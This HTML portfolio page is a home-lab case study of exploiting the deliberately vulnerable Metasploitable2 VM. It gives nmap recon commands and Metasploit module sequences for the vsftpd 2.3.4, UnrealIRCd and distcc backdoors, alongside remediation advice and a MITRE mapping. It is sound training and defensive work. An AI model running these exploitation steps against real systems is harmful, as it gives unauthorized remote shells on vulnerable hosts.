<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Metasploitable2 — Exploitation | Shayaan Rashedin</title>
  <link rel="stylesheet" href="style.css" />
  <script defer src="script.js"></script>
</head>
<body>
  <!-- Global header -->
  <header class="site-header">
    <div class="container header-inner">
      <a class="brand" href="index.html" aria-label="Homepage">
        <span class="brand-mark">SR</span>
        <span class="brand-text">Shayaan Rashedin</span>
      </a>
      <nav aria-label="Primary">
        <a href="projects.html">Projects</a>
        <a href="homelab.html" class="active" aria-current="page">Home Lab</a>
        <a href="resume.html">Resume</a>
        <a href="contact.html">Contact</a>
      </nav>
      <button id="theme-toggle" class="btn sm">Toggle Theme</button>
    </div>
  </header>

  <main class="container project-body">
    <!-- Hero -->
    <section class="proj-hero">
      <h1 class="page-title">Metasploitable2 — Exploitation (Lab Case Study)</h1>
      <p class="meta-line">
        Validating exploitability against intentionally vulnerable services in an isolated environment.
        Focus: reliable exploits, clear proof artifacts, and defender-oriented remediation.
      </p>
      <div class="chip-row">
        <span class="chip">Tools: Kali Linux, Metasploit, Nmap, Netcat</span>
        <span class="chip">Target: 192.168.56.101 (Metasploitable2)</span>
        <span class="chip">Attacker: 192.168.56.102 (Kali)</span>
        <span class="chip">Scope: Controlled lab only</span>
      </div>
    </section>

    <!-- Overview -->
    <section>
      <h2>Project Overview</h2>
      <p>
        Building on the Network Scanning &amp; Reconnaissance project, this page captures exploitation steps for
        several high-impact services exposed by Metasploitable2. Each subsection documents the
        rationale, exact commands, evidence (Figures), and the remediation perspective.
      </p>
    </section>

    <!-- Setup & Environment -->
    <section>
      <h2>Setup &amp; Environment</h2>
      <p>VirtualBox host-only network (<code>192.168.56.0/24</code>). Snapshots taken before exploitation.</p>

      <div class="evidence-grid">
        <figure>
          <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/ifconfig_exploit.png"
               alt="Target interface configuration" />
          <figcaption>Figure 01 — Target interface confirmation (<code>192.168.56.101</code>).</figcaption>
        </figure>
        <figure>
          <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/ping-2.png"
               alt="ICMP reachability from Kali to target" />
          <figcaption>Figure 02 — ICMP reachability from attacker (<code>192.168.56.102</code>) to target.</figcaption>
        </figure>
      </div>

      <!-- Config dropdown -->
      <div class="accordion">
        <div class="accordion-item">
          <div class="accordion-header" aria-controls="cfg-exploit" aria-expanded="false">Configuration snippets</div>
          <div id="cfg-exploit" class="accordion-content">
            <pre><code># Kali (attacker)
ip addr show eth1
# Excerpt: inet 192.168.56.102/24

# Metasploitable2 (target)
ifconfig eth0
# Excerpt: inet addr:192.168.56.101  Mask:255.255.255.0

# VirtualBox host-only: vboxnet0 | 192.168.56.0/24 | DHCP disabled
</code></pre>
          </div>
        </div>
      </div>
    </section>

    <!-- Recon summary -->
    <section>
      <h2>Recon Summary (brief)</h2>
      <p>
        Reconnaissance identified multiple vulnerable services, including <code>vsftpd 2.3.4</code> (21/tcp),
        <code>UnrealIRCd 3.2.8.1</code> (6667/tcp), and <code>distcc</code> (3632/tcp). Exploitation focused on
        reliable, well-documented modules to demonstrate impact and capture proof.
      </p>

      <!-- Recon commands dropdown -->
      <div class="accordion">
        <div class="accordion-item">
          <div class="accordion-header" aria-controls="cmds-recon" aria-expanded="false">Commands — Recon quick reference</div>
          <div id="cmds-recon" class="accordion-content">
            <pre><code># From the recon phase
nmap -sS -p- -T4 -oN nmap-full.txt 192.168.56.101
nmap -sV -sC -O -oN nmap-services-os.txt 192.168.56.101
curl -I http://192.168.56.101
</code></pre>
          </div>
        </div>
      </div>
    </section>

    <!-- Exploitation sections -->
    <section>
      <h2>Exploitation — Procedure, Evidence &amp; Proof</h2>
      <p>
        Each subsection includes: rationale, exact commands (dropdown), and Figures showing shells/proof artifacts.
        Testing remained inside the lab; no external systems were targeted.
      </p>

      <!-- vsftpd -->
      <article class="project-section">
        <h3>Exploit 1 — vsftpd 2.3.4 Backdoor (<a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2523" target="_blank" rel="noopener">CVE-2011-2523</a>)</h3>
        <p><strong>Rationale:</strong> Known backdoored release; extremely reliable lab validation on port 21.</p>

        <div class="evidence-grid">
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/vsftpd-search.png"
                 alt="Metasploit search vsftpd module" />
            <figcaption>Figure 03 — Module discovery: <code>exploit/unix/ftp/vsftpd_234_backdoor</code>.</figcaption>
          </figure>
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/vsftpd-exploit.png"
                 alt="vsftpd exploitation result" />
            <figcaption>Figure 04 — Successful exploitation and proof artifact creation.</figcaption>
          </figure>
        </div>

        <div class="accordion">
          <div class="accordion-item">
            <div class="accordion-header" aria-controls="cmd-vsftpd" aria-expanded="false">Commands — vsftpd validation</div>
            <div id="cmd-vsftpd" class="accordion-content">
              <pre><code>msfconsole -q
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.56.101
set RPORT 21
set PAYLOAD cmd/unix/interact
exploit

# Proof (on target)
cat /tmp/proof_vsftpd.txt
</code></pre>
            </div>
          </div>
        </div>
      </article>

      <!-- UnrealIRCd -->
      <article class="project-section">
        <h3>Exploit 2 — UnrealIRCd 3.2.8.1 Backdoor (<a href="https://nvd.nist.gov/vuln/detail/CVE-2010-2075" target="_blank" rel="noopener">CVE-2010-2075</a>)</h3>
        <p><strong>Rationale:</strong> Backdoored tarball provides remote command execution on port 6667.</p>

        <div class="evidence-grid">
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/unreal-search.png"
                 alt="Metasploit search unreal_ircd" />
            <figcaption>Figure 05 — Module discovery for UnrealIRCd.</figcaption>
          </figure>
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/unreal-exploit.png"
                 alt="UnrealIRCd exploitation" />
            <figcaption>Figure 06 — Bind shell &amp; proof file on target.</figcaption>
          </figure>
        </div>

        <div class="accordion">
          <div class="accordion-item">
            <div class="accordion-header" aria-controls="cmd-unreal" aria-expanded="false">Commands — UnrealIRCd validation</div>
            <div id="cmd-unreal" class="accordion-content">
              <pre><code>msfconsole -q
search unreal_ircd
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST 192.168.56.101
set RPORT 6667
set PAYLOAD cmd/unix/interact
exploit

# Proof
cat /tmp/proof_unreal.txt
</code></pre>
            </div>
          </div>
        </div>
      </article>

      <!-- distcc -->
      <article class="project-section">
        <h3>Exploit 3 — distcc (<a href="https://nvd.nist.gov/vuln/detail/CVE-2004-2687" target="_blank" rel="noopener">CVE-2004-2687</a>)</h3>
        <p><strong>Rationale:</strong> distcc exposes RCE on port 3632 when not restricted to trusted build hosts.</p>

        <div class="evidence-grid">
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/distcc-search.png"
                 alt="Metasploit search distcc" />
            <figcaption>Figure 07 — distcc module identified in Metasploit.</figcaption>
          </figure>
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/distcc-exploit.png"
                 alt="distcc exploitation and proof" />
            <figcaption>Figure 08 — Command execution and proof artifact.</figcaption>
          </figure>
        </div>

        <div class="accordion">
          <div class="accordion-item">
            <div class="accordion-header" aria-controls="cmd-distcc" aria-expanded="false">Commands — distcc validation</div>
            <div id="cmd-distcc" class="accordion-content">
              <pre><code>msfconsole -q
search distcc
use exploit/unix/misc/distcc_exec
set RHOST 192.168.56.101
set RPORT 3632
set PAYLOAD cmd/unix/interact
exploit

# Proof
cat /tmp/proof_distcc.txt
</code></pre>
            </div>
          </div>
        </div>
      </article>

      <!-- Additional evidence -->
      <section>
        <h4>Artifacts</h4>
        <div class="evidence-grid">
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/msfconsole.png"
                 alt="msfconsole session" />
            <figcaption>Figure 09 — msfconsole session ready for exploitation.</figcaption>
          </figure>
          <figure>
            <img class="lab-img" src="assets/homelab_projects/metasploitable2-exploit/images/postex-proof.png"
                 alt="Proof file and system context" />
            <figcaption>Figure 10 — Post-ex proof and system context (whoami, id, etc.).</figcaption>
          </figure>
        </div>
      </section>
    </section>

    <!-- Analysis table -->
    <section>
      <h2>Analysis &amp; Findings</h2>
      <div class="table-scroll">
        <table class="checklist-table">
          <thead>
            <tr><th>Service</th><th>Port</th><th>Exploit</th><th>CVE</th><th>Impact</th></tr>
          </thead>
          <tbody>
            <tr>
              <td>vsftpd</td><td>21/tcp</td>
              <td>exploit/unix/ftp/vsftpd_234_backdoor</td>
              <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2011-2523" target="_blank" rel="noopener">CVE-2011-2523</a></td>
              <td>Unauthenticated remote shell (lab)</td>
            </tr>
            <tr>
              <td>UnrealIRCd</td><td>6667/tcp</td>
              <td>exploit/unix/irc/unreal_ircd_3281_backdoor</td>
              <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2010-2075" target="_blank" rel="noopener">CVE-2010-2075</a></td>
              <td>Backdoor/bind shell (lab)</td>
            </tr>
            <tr>
              <td>distcc</td><td>3632/tcp</td>
              <td>exploit/unix/misc/distcc_exec</td>
              <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2004-2687" target="_blank" rel="noopener">CVE-2004-2687</a></td>
              <td>Remote command execution (lab)</td>
            </tr>
          </tbody>
        </table>
      </div>
      <p class="muted">All activity was performed on intentionally vulnerable systems inside a closed lab.</p>
    </section>

    <!-- Remediation & Defense -->
    <section>
      <h2>Remediation &amp; Defensive View</h2>
      <ul>
        <li><strong>Remove/upgrade</strong> backdoored services (vsftpd, UnrealIRCd) and <strong>disable distcc</strong> or restrict to trusted build hosts via firewall rules.</li>
        <li><strong>Replace legacy protocols</strong> (Telnet → SSH with key-based auth) and <strong>disable anonymous/guest</strong> access where present.</li>
        <li><strong>Patch &amp; harden</strong> OS and middleware; apply CIS baselines; minimize attack surface by disabling unused services.</li>
        <li><strong>Monitor &amp; alert</strong> via SIEM: unusual connections to high-risk ports (21, 3632, 6667), anomalous process launches, integrity changes.</li>
      </ul>
    </section>

    <!-- MITRE mapping -->
    <section>
      <h2>MITRE ATT&amp;CK Mapping</h2>
      <table class="checklist-table">
        <thead><tr><th>Technique</th><th>Notes</th></tr></thead>
        <tbody>
          <tr><td>T1595 — Active Scanning</td><td>Recon informed exploit selection (Nmap, banner grabs).</td></tr>
          <tr><td>T1190 — Exploit Public-Facing Application</td><td>vsftpd, UnrealIRCd, distcc exploitation.</td></tr>
          <tr><td>T1059 — Command &amp; Scripting Interpreter</td><td>Shells/command execution validated impact.</td></tr>
        </tbody>
      </table>
    </section>

    <!-- Reflection -->
    <section>
      <h2>Reflection &amp; Recruiter Takeaways</h2>
      <ul>
        <li><strong>Skills:</strong> Metasploit proficiency, safe lab exploitation, evidence capture, clear reporting.</li>
        <li><strong>Outcome:</strong> Demonstrated end-to-end offensive workflow with defender-ready remediation guidance.</li>
      </ul>
    </section>

    <!-- Back link -->
    <section style="margin: 28px 0 8px;">
      <a class="btn neutral" href="homelab.html">← Back to Home Lab</a>
    </section>
  </main>

  <footer>
    <div class="footer-inner container">
      <p>&copy; 2025 Shayaan Rashedin. All rights reserved.</p>
    </div>
  </footer>

  <!-- Lightbox -->
  <div id="lightbox" onclick="closeLightbox()">
    <img id="lightbox-img" alt="expanded figure" />
  </div>
</body>
</html>
